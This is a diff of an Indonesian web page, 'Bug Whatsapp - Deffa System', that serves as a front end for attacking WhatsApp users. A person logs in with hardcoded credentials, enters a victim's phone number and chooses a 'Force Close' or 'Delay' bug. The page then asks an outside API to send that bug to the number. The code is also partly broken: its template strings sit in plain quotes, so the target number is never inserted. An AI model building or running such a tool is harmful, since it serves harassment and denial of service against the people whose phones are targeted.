@@ -1,72 +1,522 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Bug Sender</title>
-  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #1a1a1a;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 50px;
-    }
-    input, button {
-      margin: 10px;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
-    }
-    input {
-      width: 300px;
-    }
-    button {
-      background: #007bff;
-      color: white;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #0056b3;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Whatsapp - Deffa System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            color: #4a5568;
+            font-size: 2.5em;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo p {
+            color: #718096;
+            margin-top: 10px;
+            font-size: 1.1em;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #4a5568;
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f7fafc;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error {
+            color: #e53e3e;
+            background: #fed7d7;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #e53e3e;
+        }
+
+        .success {
+            color: #38a169;
+            background: #c6f6d5;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #38a169;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .logout-btn {
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+            padding: 10px 20px;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+/* Pop-up Styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .popup-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .popup {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            transform: scale(0.7);
+            transition: all 0.3s ease;
+        }
+
+        .popup-overlay.show .popup {
+            transform: scale(1);
+        }
+
+        .popup-icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .popup-success .popup-icon {
+            color: #38a169;
+        }
+
+        .popup-error .popup-icon {
+            color: #e53e3e;
+        }
+
+        .popup-loading .popup-icon {
+            color: #667eea;
+            animation: bounce 1s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        .popup h2 {
+            color: #4a5568;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+
+        .popup p {
+            color: #718096;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .popup-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .popup-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .popup-error .popup-btn {
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+        }
+
+        .popup-success .popup-btn {
+            background: linear-gradient(135deg, #38a169 0%, #2f855a 100%);
+        }
+    </style>
 </head>
 <body>
-  <h2>BUG TANPA SENDER BY DEFFA</h2>
-  <input type="text" id="targetNumber" placeholder="Masukkan Nomor Target (tanpa +)">
-  <br>
-  <button onclick="sendDelayBug()">Delay invisible</button>
-  <button onclick="sendForceCloseBug()">Force Close</button>
+    <!-- Pop-up Overlay -->
+    <div id="popupOverlay" class="popup-overlay">
+        <div id="popup" class="popup">
+            <span id="popupIcon" class="popup-icon">✓</span>
+            <h2 id="popupTitle">Success</h2>
+            <p id="popupMessage">Bug berhasil dikirim!</p>
+            <button id="popupBtn" class="popup-btn" onclick="closePopup()">OK</button>
+        </div>
+    </div>
 
-  <script>
-    async function sendDelayBug() {
-      const target = document.getElementById('targetNumber').value;
-      if (!target) return alert("Masukkan nomor target terlebih dahulu!");
-      const apiUrl = `http://danzy.mydigital-store.me/danzy?chatId=${target}&type=delay`;
-      try {
-        const response = await axios.get(apiUrl);
-        alert("Bug Delay Terkirim!");
-        console.log("Response:", response.data);
-      } catch (error) {
-        alert("Gagal mengirim bug delay!");
-        console.error("Error:", error);
-      }
-    }
+    <div class="container">
+        <!-- Login Form -->
+        <div id="loginForm">
+            <div class="logo">
+                <h1>Bug Whatsapp</h1>
+                <p>Deffa Website Bugs</p>
+            </div>
+            
+            <div id="loginError" class="error hidden"></div>
+            
+            <form id="loginFormElement">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <button type="submit" class="btn" id="loginBtn">
+                    Login
+                </button>
+            </form>
+        </div>
 
-    async function sendForceCloseBug() {
-      const targetNumber = document.getElementById('targetNumber').value;
-      if (!targetNumber) return alert("Masukkan nomor target terlebih dahulu!");
-      const apiUrl = `http://danzy.mydigital-store.me/danzy?chatId=${target}&type=fc`;
-        const response = await axios.get(apiUrl);
-        alert("Bug Force Close Terkirim!");
-        console.log("Response:", response.data);
-      } catch (error) {
-        alert("Gagal mengirim bug force close!");
-        console.error("Error:", error);
-      }
-    }
-  </script>
+<!-- Main Dashboard -->
+        <div id="dashboard" class="hidden">
+    <div class="logo">
+        <h1>Bug Whatsapp</h1>
+        <p>Selamat datang, <span id="welcomeUser"></span></p>
+    </div>
+    
+    <button class="btn logout-btn" onclick="logout()">Logout</button>
+    
+    <div id="dashboardError" class="error hidden"></div>
+    <div id="dashboardSuccess" class="success hidden"></div>
+    
+    <form id="bugForm">
+        <div class="form-group">
+            <label for="bugType">Pilih Jenis Bug</label>
+            <select id="bugType" name="bugType" required>
+                <option value="">-- Pilih Bug --</option>
+                <option value="fc">Force Close</option>
+                <option value="delay">Delay</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label for="targetNumber">Nomor Target</label>
+            <input type="tel" id="targetNumber" name="targetNumber" placeholder="628xxxxxxxxx" required>
+        </div>
+        
+        <button type="submit" class="btn" id="sendBtn">
+            Send Bug
+        </button>
+
+        <!-- Status Server -->
+        <p style="margin-top: 15px; color: green; font-weight: bold;">
+            Server = Aktif
+        </p>
+    </form>
+</div>
+</div>
+
+    <script>
+        // Database pengguna
+        const users = [
+            { username: "admin", password: "deffa" },
+            { username: "member", password: "123" }
+        ];
+
+        let currentUser = null;
+
+        // Event listeners
+        document.getElementById('loginFormElement').addEventListener('submit', handleLogin);
+        document.getElementById('bugForm').addEventListener('submit', handleSendBug);
+
+        // Handle login
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const errorDiv = document.getElementById('loginError');
+            
+            // Show loading
+            loginBtn.innerHTML = '<span class="loading"></span>Logging in...';
+            loginBtn.disabled = true;
+            errorDiv.classList.add('hidden');
+            
+            // Simulate API delay
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Check credentials
+            const user = users.find(u => u.username === username && u.password === password);
+            
+            if (user) {
+                currentUser = user;
+                document.getElementById('welcomeUser').textContent = user.username;
+                document.getElementById('loginForm').classList.add('hidden');
+                document.getElementById('dashboard').classList.remove('hidden');
+            } else {
+                errorDiv.textContent = 'Username atau password salah!';
+                errorDiv.classList.remove('hidden');
+            }
+            
+            // Reset button
+            loginBtn.innerHTML = 'Login';
+            loginBtn.disabled = false;
+        }
+
+        // Handle send bug
+        async function handleSendBug(e) {
+            e.preventDefault();
+            
+            const bugType = document.getElementById('bugType').value;
+            const targetNumber = document.getElementById('targetNumber').value;
+            const sendBtn = document.getElementById('sendBtn');
+            
+            // Validate
+            if (!bugType) {
+                showPopup('error', 'Error', 'Pilih jenis bug terlebih dahulu!', '❌');
+                return;
+            }
+            
+            if (!targetNumber) {
+                showPopup('error', 'Error', 'Masukkan nomor target!', '❌');
+
+return;
+            }
+            
+            // Validate phone number format
+            if (!/^\d{6,15}$/.test(targetNumber)) {
+    showPopup('error', 'Format Salah', 'Format nomor salah! Gunakan format internasional tanpa simbol, contoh: 6281234567890', '⚠️');
+}
+            
+            // Show loading popup
+            showPopup('loading', 'Sending...', 'Sedang mengirim bug, harap tunggu...', '⏳');
+            
+            // Show loading on button
+            sendBtn.innerHTML = '<span class="loading"></span>Sending...';
+            sendBtn.disabled = true;
+            
+            try {
+                await sendBugRequest(targetNumber, bugType);
+                
+                // Show success popup
+                showPopup('success, Berhasil!, Bug ${bugType} berhasil dikirim ke ${targetNumber}!, ✅');
+                
+                // Reset form
+                document.getElementById('bugForm').reset();
+                
+            } catch (error) {
+                // Show error popup
+                showPopup('error', 'Gagal!', 'Gagal mengirim bug: ' + error.message, '❌');
+            }
+            
+            // Reset button
+            sendBtn.innerHTML = 'Send Bug';
+            sendBtn.disabled = false;
+        }
+
+        // Send bug request to API
+        async function sendBugRequest(target, bugType) {
+            const apiUrl = ('https://cella-saja.mydigital-store.me/permen?chatId=${target}&type=${bugType}');
+            
+            const response = await fetch(apiUrl, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            });
+            
+            if (!response.ok) {
+                throw new Error('HTTP error! status: ${response.status}');
+            }
+            
+            return await response.json();
+        }
+
+        // Show popup function
+        function showPopup(type, title, message, icon) {
+            const popup = document.getElementById('popup');
+            const popupOverlay = document.getElementById('popupOverlay');
+            const popupIcon = document.getElementById('popupIcon');
+            const popupTitle = document.getElementById('popupTitle');
+            const popupMessage = document.getElementById('popupMessage');
+            
+            // Set popup content
+            popupIcon.textContent = icon;
+            popupTitle.textContent = title;
+            popupMessage.textContent = message;
+            
+            // Set popup type class
+            
+            
+            // Show popup
+            popupOverlay.classList.add('show');
+            
+            // Auto close for loading type
+            if (type === 'loading') {
+                // Don't auto close loading popup
+                document.getElementById('popupBtn').style.display = 'none';
+            } else {
+                document.getElementById('popupBtn').style.display = 'inline-block';
+            }
+        }
+
+        // Close popup function
+        function closePopup() {
+            const popupOverlay = document.getElementById('popupOverlay');
+            popupOverlay.classList.remove('show');
+        }
+
+        // Close popup when clicking overlay
+        document.getElementById('popupOverlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closePopup();
+            }
+        });
+
+        // Close popup with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closePopup();
+            }
+        });
+
+        // Logout function
+        function logout() {
+            currentUser = null;
+            document.getElementById('dashboard').classList.add('hidden');
+            document.getElementById('loginForm').classList.remove('hidden');
+            document.getElementById('loginFormElement').reset();
+            document.getElementById('loginError').classList.add('hidden');
+        }
+
+// Auto-logout after 30 minutes
+setTimeout(() => {
+            if (currentUser) {
+                showPopup('error', 'Sesi Berakhir', 'Sesi telah berakhir. Silakan login kembali.', '⏰');
+                setTimeout(logout, 2000);
+            }
+        }, 30 * 60 * 1000);
+    </script>
 </body>
 </html>
